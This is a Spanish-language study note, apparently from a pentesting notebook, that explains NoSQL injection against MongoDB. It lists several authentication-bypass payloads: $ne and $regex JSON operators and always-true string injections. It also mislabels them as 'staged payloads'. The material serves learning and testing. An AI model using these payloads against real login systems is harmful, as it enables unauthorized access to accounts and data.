___

- Tags: 

____

# Introducción

Las **Inyecciones NoSQL** son técnicas de explotación que se aprovechan de las debilidades en la validación de datos durante las consultas a bases de datos [[NoSQL]]. A diferencia de las [[Inyección SQL|Inyecciones SQL]], que se centran en bases de datos relacionales, las **Inyecciones NoSQL** están específicamente diseñadas para bases de datos [[NoSQL]], como [[MongoDB]], siendo este último un ejemplo común en este contexto.

___
# Ejemplos de Payloads

### Payload con $ne (not equal):

```json
{
	"username": {
		"$ne": "pedro"
	},
	"password": {
		"$ne": "admin"
	}
}
```

Este [[Payload Staged|payload]] utiliza la condición `$ne` (not equal) para los campos "username" y "password". Al proporcionar un nombre de usuario que no sea "pedro" y una contraseña que no sea "admin", se permite el acceso al sistema eludiendo la validación.

### Payload con $regex (expresión regular):

```json
{
	"username": {
		"$regex": "^a"
	},
	"password": {
		"$ne": "admin"
	}
}
```

En este caso, el [[Payload Staged|payload]] utiliza `$regex` para buscar un usuario cuyo nombre comience con la letra 'a' y cuya contraseña no sea "admin". La **inyección NoSQL** con `$regex` puede automatizarse para descubrir usuarios y contraseñas de manera eficiente.

### Otros Ejemplos de Payloads Diseñados para MongoDB:

```bash
|| 1==1// 
```

Este [[Payload Staged|payload]] se aprovecha de la lógica booleana para siempre evaluar como verdadera, lo que podría eludir ciertas condiciones de validación.

```bash
' || 1==1%00
```

Similar al anterior, pero incluye un caracter nulo `%00` que puede ser utilizado para evitar la interpretación incorrecta de ciertos filtros.

```bash 
admin' || 'a'=='a
```

Introduce una condición que siempre se evalúa como verdadera, permitiendo el acceso al sistema con el nombre de usuario "admin".

____
# Referencias Adicionales

Para obtener más información sobre [[Payload Staged|payloads]] y técnicas de **Inyección NoSQL** en [[MongoDB]], puedes consultar las siguientes páginas:

- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [HackTricks - NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)

